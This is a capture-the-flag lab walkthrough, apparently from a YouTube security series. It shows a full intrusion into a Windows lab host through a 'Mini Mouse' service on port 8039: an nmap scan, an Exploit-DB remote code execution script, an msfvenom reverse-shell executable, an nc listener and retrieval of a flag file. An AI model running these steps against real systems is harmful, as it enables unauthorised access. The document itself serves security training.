# 0. Sources

|||
|---|---|
|[YouTube](https://www.youtube.com/watch?v=MD5GIbatPg8)|[Download](https://drive.google.com/file/d/1K5_YA76DVtICHst2FlLVjq68dgNkMgRX/view)|

# 1. nmap scan

```console
┌──(root㉿kali)-[~]
└─$ nmap -p- -A 10.0.88.33
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 10:40 +08
Nmap scan report for 10.0.88.33
Host is up (0.017s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 10 Pro 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=mousekatoo
| Not valid before: 2022-11-26T02:39:44
|_Not valid after:  2023-05-28T02:39:44
|_ssl-date: 2022-11-27T02:42:53+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: MOUSEKATOO
|   NetBIOS_Domain_Name: MOUSEKATOO
|   NetBIOS_Computer_Name: MOUSEKATOO
|   DNS_Domain_Name: mousekatoo
|   DNS_Computer_Name: mousekatoo
|   Product_Version: 10.0.14393
|_  System_Time: 2022-11-27T02:42:39+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8039/tcp  open  unknown
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404 OK
|     Server: bruce_wy/1.0.0
|     Access-Control-Allow-Methods: POST,GET,TRACE,OPTIONS
|     Access-Control-Allow-Headers: Content-Type,Origin,Accept
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     P3P: CP=CAO PSA OUR
|     Content-Type: text/html
|     Content-Range: bytes 0-0/-1
|_    Content-Length : 4294967295
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
⋮
Host script results:
| smb2-time:
|   date: 2022-11-27T02:42:42
|_  start_date: 2022-11-27T02:39:44
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
| smb-os-discovery:
|   OS: Windows 10 Pro 14393 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: mousekatoo
|   NetBIOS computer name: MOUSEKATOO\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-26T18:42:43-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.22 seconds
```

# 2. Checking for exploits

Port `8039` returned HTTP data

Searching for the `Server: bruce_wy/1.0.0` information on google leads us to a [Mini Mouse 9.2.0 Path Traversal exploit](https://www.exploit-db.com/exploits/49744)

Path traversal isn't exactly useful, let's search if there are more `mini mouse` exploits

```console
┌──(root㉿kali)-[~]
└─$ searchsploit mini mouse
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
Mini Mouse 9.2.0 - Path Traversal           | windows/webapps/49744.txt
Mini Mouse 9.2.0 - Remote Code Execution    | windows/webapps/49743.py
Mini Mouse 9.3.0 - Local File inclusion     | ios/webapps/49747.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The RCE exploit looks interesting, let's try that

☝️ A faster method is to google for `8039 site:www.exploit-db.com`, which will also return the Mini Mouse RCE exploit as a result

# 3. Targeting the Mini Mouse service

Aanalyzing the exploit code shows that it executes a selected payload:

```console
┌──(root㉿kali)-[~]
└─$ searchsploit -m 49743
  Exploit: Mini Mouse 9.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49743
     Path: /usr/share/exploitdb/exploits/windows/webapps/49743.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/49743.py

┌──(root㉿kali)-[~]
└─$ cat 49743.py
⋮
ip = input("target's ip:  ")
lhost = input("local http server ip: ")
name = input("payload file name: ")
url = "http://{}:8039/op=command".format(ip)
⋮
```

# 4. Getting a shell

Generate reverse shell executable and setup web server endpoint on Kali:

(Apache2 is already running with DocumentRoot at `/var/www/html`)

```console
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/reverse.exe

Open another console window on Kali to listen for connections:

```console
┌──(root㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
```

Run the exploit and get our shell:

```console
┌──(root㉿kali)-[~]
└─$ python3 49743.py
Traceback (most recent call last):
  File "/home/kali/49743.py", line 12, in <module>
    import jsonargparse
ModuleNotFoundError: No module named 'jsonargparse'

┌──(root㉿kali)-[~]
└─$ pip install jsonargparse
Defaulting to user installation because normal site-packages is not writeable
Collecting jsonargparse
  Downloading jsonargparse-4.17.0-py3-none-any.whl (165 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 165.3/165.3 kB 6.3 MB/s eta 0:00:00
Requirement already satisfied: PyYAML>=3.13 in /usr/lib/python3/dist-packages (from jsonargparse) (5.4.1)
Installing collected packages: jsonargparse
Successfully installed jsonargparse-4.17.0

┌──(root㉿kali)-[~]
└─$ python3 49743.py
target's ip:  10.0.88.33
local http server ip: kali.vx
payload file name: reverse.exe
[+] Retrieving payload
200
[+] got shell!
```

Verify that the reverse shell has hooked on from the listener console

```cmd
connect to [192.168.17.10] from (UNKNOWN) [10.0.88.51] 49786
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Mini Mouse>whoami
whoami
mousekatoo\mickey
```

Excellent, we now have shell on the target

# 5. Getting the proof

Since we know that the proof is a file on the user's desktop, let's get straight to it

```cmd
C:\Program Files (x86)\Mini Mouse>cd %USERPROFILE%
cd %USERPROFILE%

C:\Users\Mickey>dir /s *flag.txt*
dir /s *flag.txt*
 Volume in drive C has no label.
 Volume Serial Number is DA18-B95C

 Directory of C:\Users\Mickey\AppData\Roaming\Microsoft\Windows\Recent

09/14/2021  10:46 PM               632 flag.txt.lnk
               1 File(s)            632 bytes

 Directory of C:\Users\Mickey\Desktop

09/14/2021  10:48 PM                73 flag.txt.txt
               1 File(s)             73 bytes

     Total Files Listed:
               2 File(s)            705 bytes
               0 Dir(s)  42,366,476,288 bytes free

C:\Users\Mickey>type Desktop\flag.txt.txt
type Desktop\flag.txt.txt
the more you hack, the better you become

- i.t security labs (youtube)
```
